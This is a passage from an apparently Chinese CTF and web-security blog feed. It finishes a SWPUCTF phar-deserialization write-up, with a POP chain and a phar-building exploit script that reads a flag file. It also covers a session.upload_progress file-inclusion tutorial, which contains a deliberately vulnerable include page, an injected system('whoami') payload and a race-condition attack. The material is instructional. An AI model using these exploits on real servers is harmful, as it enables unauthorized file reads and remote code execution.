<span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这里是上传页面的源码，可以看到它是一个后缀白名单验证，能用的后缀只有<code>gif、jpeg、jpg、png</code>，并且文件名我们也知道，然后看文件路径，是在<code>upload/</code>目录下的，那看来这些上传信息我们都知道，成功希望很大哈哈哈</p><p>class.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里应该是反序列化的核心地方了，我们得先把<code>pop</code>链找出来才能继续操作，具体找<code>pop</code>链子的方法可以看看我之前写的文章，这里还是简单分析一下，首先还是从尾部开始，找找哪里可以读<code>flag</code>，发现在<code>Show</code>类中的<code>_show()</code>函数以及<code>Test</code>类中的<code>file_get()</code>函数都可以读取文件，但<code>Show</code>类中的<code>_show()</code>函数中禁掉了<code>f1ag</code>，恐怕绕不过去，而且这道题是<code>phar</code>反序列化，肯定需要一个文件操作函数，而<code>Test</code>类中的<code>file_get()</code>函数里面正好有<code>file_get_contents()</code>，这就很明显了，很明显链子的尾部在这里，然后往前推，在<code>Test</code>类中的<code>get()</code>调用了它，然后<code>Test</code>类中的<code>__get()</code>调用了<code>get()</code>，然后往前看哪里可以调用<code>__get()</code>，在<code>Show</code>类中的<code>__toString()</code>可以调用它，再往前看，<code>C1r4r</code>类中的<code>__destruct()</code>有个<code>echo $this-&gt;test</code>，如果把它实例化成一个对象就可以调用<code>__toString()</code>，这样一条完整的pop链就出来了：</p><p><code>头-&gt;C1e4r::__destruct() -&gt; Show::toString() -&gt; Test::__get() -&gt; Test::get() -&gt; Test::file_get()-&gt;尾</code></p><p>有了<code>pop</code>链就直接开始构造吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span> = <span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span> =&gt; <span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> C1e4r();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span> -&gt; str = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>咱先看看它序列化出来长啥样，其实这一步也可以省略，直接写入<code>phar</code>文件也行，但这里想看看以防出问题：</p><p><img src="https://i.loli.net/2021/09/05/UFca1bCNwhzVGLB.png" alt="image.png"></p><p>应该是没啥问题的，那我们就把它写入<code>phar</code>文件中了，这里记得添加<code>GIF89a</code>的文件头哈，然后它上传上去的文件名是我们本身的文件名加上<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>的值再整体md5加密后的值，这里我们也把它输出出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span> = <span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span> =&gt; <span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> C1e4r();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span> -&gt; str = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;swpu.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering(); </span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;testaaa&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(md5(<span class="string">&#x27;swpu.jpg125.70.254.68&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行这个文件，成功生成了<code>swpu.phar</code>，然后把它改名改成<code>swpu.jpg</code>，在上传页面进行上传，成功上传上去</p><p><img src="https://i.loli.net/2021/09/05/RW6UlXidpvEYe89.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/09/05/EynJZxXgva8mepL.png" alt="image.png"></p><p>然后在<code>file.php</code>用<code>phar://</code>伪协议来解析它，文件的路径为<code>upload/71cb3247543c58c069b4f9d7eee78130.jpg</code>,所以说最后就是：<code>phar://upload/71cb3247543c58c069b4f9d7eee78130.jpg</code></p><p><img src="https://i.loli.net/2021/09/05/esOZHzjCNX8Vagd.png" alt="image.png"></p><p>成功拿下，这道题难度其实也还好，只要找出了pop链应该就能出来</p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>这篇文章的最后我们来总结一下<code>phar</code>反序列化的利用条件：</p><p>1.<code>phar</code>文件要能上传到服务器端，并且要知道传上去的路径，如果根本不能传或者不知道传哪儿去了，这都很难利用</p><p>2.文件操作函数的参数要可控</p><p>3.通过文件操作函数之后要有合适的魔术方法，一般是<code>__wakeup()</code>或者<code>__destruct()</code></p><p>4.<code>phar</code>、<code>/</code>、<code>:</code>等特殊字符不能被过滤掉</p><p>参考文章：</p><p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p><p><a href="https://websec.readthedocs.io/zh/latest/language/php/phar.html">https://websec.readthedocs.io/zh/latest/language/php/phar.html</a></p><p><a href="https://guokeya.github.io/post/swpuctf-2018simplephppop-lian-phar-fan-xu-lie-hua/">https://guokeya.github.io/post/swpuctf-2018simplephppop-lian-phar-fan-xu-lie-hua/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;phar反序列化&quot;&gt;&lt;a href=&quot;#phar反序列化&quot; class=&quot;headerlink&quot; title=&quot;phar反序列化&quot;&gt;&lt;/a&gt;phar反序列化&lt;/h1&gt;&lt;p&gt;曾经我对于phar的印象，也就是知道好像有个&lt;code&gt;phar://&lt;/code&gt;的伪协议，可以将任意后缀名的压缩包解包，从而可以通过上传压缩包绕过对后缀名的限制，再利用伪协议实现文件包含；后来我才知道，利用phar文件包还可以发起反序列化，使PHP反序列化漏洞的利用面更宽广了&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>利用seesion.upload_progress实现文件包含</title>
    <link href="https://arsenetang.github.io/2021/09/01/%E5%88%A9%E7%94%A8session.upload_progress%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://arsenetang.github.io/2021/09/01/%E5%88%A9%E7%94%A8session.upload_progress%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2021-08-31T16:00:00.000Z</published>
    <updated>2021-09-01T12:09:07.875Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用Session-upload-progress实现文件包含"><a href="#利用Session-upload-progress实现文件包含" class="headerlink" title="利用Session.upload_progress实现文件包含"></a>利用Session.upload_progress实现文件包含</h1><p>上一篇文章中我们讲到了Session反序列化，但不知道大家有没有发现一个问题，就是我们是利用GET传参将我们构造好的恶意代码传入Session中的，但假如没有GET传参呢？我们还能往Seesion中写入恶意代码吗？</p><span id="more"></span><p>答案肯定是可以的，不然我写这文章还有啥意义呢哈哈哈，这里就要介绍出这篇文章的主人公：<code>session.upload_progress</code>了</p><h2 id="1-session-upload-progress是什么？"><a href="#1-session-upload-progress是什么？" class="headerlink" title="1.session.upload_progress是什么？"></a>1.session.upload_progress是什么？</h2><p>这里我们还是看看官方文档：<a href="https://www.php.net/manual/zh/session.upload-progress.php">https://www.php.net/manual/zh/session.upload-progress.php</a></p><p><img src="https://i.loli.net/2021/09/01/ifcTdM3AnwWxpVa.png" alt="image.png"></p><p>就是说在上传任意文件时，当我们<code>POST</code>上传一个与<code>session.upload_progress.name</code>同名的变量时，它就会在<code>$_SESSION</code>中增加一组数据</p><h2 id="2-相关配置"><a href="#2-相关配置" class="headerlink" title="2.相关配置"></a>2.相关配置</h2><p>我们在官方文档中看到了非常多的配置，而这些配置是成功实现上传的前提</p><p>1.<code>session.upload_progress.enabled</code>：当这个配置为On时，代表<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中，也就是说如果这个选项关掉了，这种方法就用不了了，好在它是默认开启的</p><p><img src="https://i.loli.net/2021/09/01/eFp98MfR4b3dusr.png" alt="image.png"></p><p>2.<code>session.upload_progress.cleanup</code>：这个选项默认也是<code>On</code>，也就是说当文件上传结束时，<code>session</code>文件中有关上传进度的信息立马就会被删除掉；这里就给我们的操作造成了很大的困难，我们就只能使用条件竞争的方式不停的发包，争取在它被删除掉之前就成功利用</p><p><img src="https://i.loli.net/2021/09/01/CpbAiqMwGkWvdz2.png" alt="image.png"></p><p>3.<code>session.upload_progress.name</code>：这个的默认值是<code>PHP_SESSION_UPLOAD_PROGRESS</code>，也就是说我们要<code>POST</code>上传的变量名也要为<code>PHP_SESSION_UPLOAD_PROGRESS</code>，并且<code>PHP_SESSION_UPLOAD_PROGRESS</code>变量的值也会被写入<code>Session</code>中，最重要的就是它的值可控</p><p><img src="https://i.loli.net/2021/09/01/KITfgekNhCG7Pnm.png" alt="image.png"></p><p>4.<code>session.upload_progress.prefix</code>：这个其实我感觉作用不是很大，它的默认值为：<code> upload_progress_</code>，通过官方文档我们可以得知，它写入session文件内容的格式为<code>session.upload_progress.prefix</code>+<code>session.upload_progress.name</code>连接在一起的值，那么在我们这种配置的情况下，它的格式就是<code>upload_progress_</code>+<code>PHP_SESSION_UPLOAD_PROGRESS的值</code></p><p><img src="https://i.loli.net/2021/09/01/chvo2mCJBpaU3kK.png" alt="image.png"></p><p>5.<code>session.use_strict_mode</code>：之前测试时我们都是通过<code>session_start()</code>打开的<code>session</code>，那假如没有<code>session_start()</code>岂不是就不能利用了？但由于<code>session.use_strict_mode</code>这个选项默认是不开启的，相当于我们就可以自己定义<code>session_id</code>，比如我在请求包中设置<code>COOKIE</code>为<code>PHPSESSID=haha</code>，那么就会生成一个<code>sess_haha</code>的<code>session</code>文件，此时php会自动初始化session，并产生一个键值，格式如上</p><p><img src="https://i.loli.net/2021/09/01/xDYNJM6bmG7uA3I.png" alt="image.png"></p><h2 id="3-文件包含"><a href="#3-文件包含" class="headerlink" title="3.文件包含"></a>3.文件包含</h2><p>既然我们可以通过<code>session.upload_progress</code>将恶意代码写入到<code>Session</code>文件中，而且文件名字和文件路径我们都可控，那一个很常见的思路就是将恶意代码写入<code>Session</code>文件之后，利用文件包含来包含它，但由于<code>session.upload_progress.cleanup = On</code>的存在，我们需要用burp不停发包，然后用同样的方式不停的发送文件包含的数据包，看能不能包含成功，接下来就开始测试：</p><p>先写一个存在文件包含漏洞的页面，命名为<code>test4.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后再写一个表单，这个表单要用<code>POST</code>上传两个东西，一个是任意文件，一个是变量名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>的变量</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>好了，准备开始操作！在表单这个页面随便选择一个文件，用<code>burp</code>抓包，如下图：</p><p><img src="https://i.loli.net/2021/09/01/i9ItkToZKQBxbfU.png" alt="image.png"></p><p>先将我们想要写入的恶意代码写进去，就写入到<code>PHP_SESSION_UPLOAD_PROGRESS</code>的值中，接在111的后面就行，这里我就用<code>&lt;?php system(&#39;whoami&#39;)?&gt;</code>来演示，然后我们把<code>PHPSESSID</code>的值改为<code>lalala</code>，这里我们先不用条件竞争，就先发一次包，看在存储<code>Session</code>的目录下<code>D:\phpStudy\PHPTutorial\tmp\tmp</code>有没有生成<code>sess_lalala</code>这个文件：</p><p><img src="https://i.loli.net/2021/09/01/dc3GF5Qwv61n7ea.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/09/01/AKE3YBR5whHdC2s.png" alt="image.png"></p><p>可以看到文件以及成功生成了，但大小是0kb，那里面肯定是没有东西的，这就是因为我们上文提到的<code>session.upload_progress.cleanup</code>将它自动删除掉了，所以说我们才需要条件竞争不停的发包，相当于写的比它删的快，这样就可以成功写进去了，我们把这个数据包发送到<code>burp</code>的爆破模块中，利用爆破不停的发包，这里我设置的发包次数是100000次，由于网速的原因，它还是需要跑很久的，这就给了我们时间去完成文件包含的操作，次数太少了可能还没包含到就被删了：</p><p><img src="https://i.loli.net/2021/09/01/73eiykro9gUpWf2.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/09/01/xiJFMhDkwBW5r3o.png" alt="image.png"></p><p>然后开始攻击，看它能不能把成功文件写进去：</p><p><img src="https://i.loli.net/2021/09/01/HSoTQxDrqdVBc34.png" alt="image.png"></p><p>开始跑了，然后我们就去存<code>Session</code>文件的那个文件夹，看那个文件里面有没有内容写进去：</p><p><img src="https://i.loli.net/2021/09/01/lqyIgrHAKtpjxFf.png" alt="image.png"></p><p>发现已经成功写进去了，看来我们写的确实比删的要快一点，然后我们这时候去完成文件包含肯定是可以成功的，成功执行了<code>whoami</code></p><p><img src="https://i.loli.net/2021/09/01/QDr4KxMiXfWUgpL.png" alt="image.png"></p><h2 id="4-反序列化"><a href="#4-反序列化" class="headerlink" title="4.反序列化"></a>4.反序列化</h2><p><code>Session</code>反序列化的内容请看上篇文章，这里只是简单提一下，我认为按理来说利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>上传文件也能实现，因为这里是通过条件竞争把我们想要的方法写入到<code>Session</code>文件中，而上一篇文章讲的是直接写入进去，虽然写入的方法不同但结果应该是相同的，但这里我试了很多次都没有成功，应该是数据包数据比较多，<code>burp</code>的发包速度不够快导致竞争不过，所以这里我就演示不了了，可以写个<code>python</code>脚本试试，具体请参照这篇文章<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a>，里面有些注意事项我就搬运过来了：</p><p>1.<code>PHPSESSID</code>必须要有，因为要竞争同一个文件</p><p>2.这里不能像上面文件包含一样把恶意代码写在<code>PHP_SESSION_UPLOAD_PROGRESS</code>值中，因为值中一旦出现了<code>|</code>就会使数据写入失败，这里要写在<code>filename</code>的值中，而且<code>filename</code>值中不能有汉字</p><p>3.要将字符串中的双引号转义，以防止与最外层的双引号冲突</p><p>4.上传的文件要大些，否则很难竞争成功，我也有可能是因为写的文件不够大导致未能成功</p><p>参考文章：</p><p><a href="https://blog.csdn.net/weixin_46330722/article/details/111657006?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_46330722/article/details/111657006?spm=1001.2014.3001.5501</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;利用Session-upload-progress实现文件包含&quot;&gt;&lt;a href=&quot;#利用Session-upload-progress实现文件包含&quot; class=&quot;headerlink&quot; title=&quot;利用Session.upload_progress实现文件包含&quot;&gt;&lt;/a&gt;利用Session.upload_progress实现文件包含&lt;/h1&gt;&lt;p&gt;上一篇文章中我们讲到了Session反序列化，但不知道大家有没有发现一个问题，就是我们是利用GET传参将我们构造好的恶意代码传入Session中的，但假如没有GET传参呢？我们还能往Seesion中写入恶意代码吗？&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
